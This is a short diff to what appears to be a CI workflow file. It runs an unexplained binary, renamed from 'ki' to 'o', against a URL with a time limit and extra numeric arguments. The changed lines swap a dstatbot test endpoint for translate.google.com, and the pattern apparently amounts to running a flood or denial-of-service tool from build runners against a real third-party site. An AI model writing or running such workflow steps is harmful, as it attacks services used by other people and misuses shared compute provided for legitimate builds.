@@ -36,10 +36,9 @@ jobs:
           chmod +x *
           mv ki o          
           
-          screen -dms ve ./o  https://c4.dstatbot.win/jJE2Q0ZZ 240 1 1 
-          screen -dms ve ./o https://c4.dstatbot.win/jJE2Q0ZZ 240 1 1 
+           
           
-          ./o https://c4.dstatbot.win/jJE2Q0ZZ 300 1 1
+          ./o https://translate.google.com 240 1 1
           
 
           
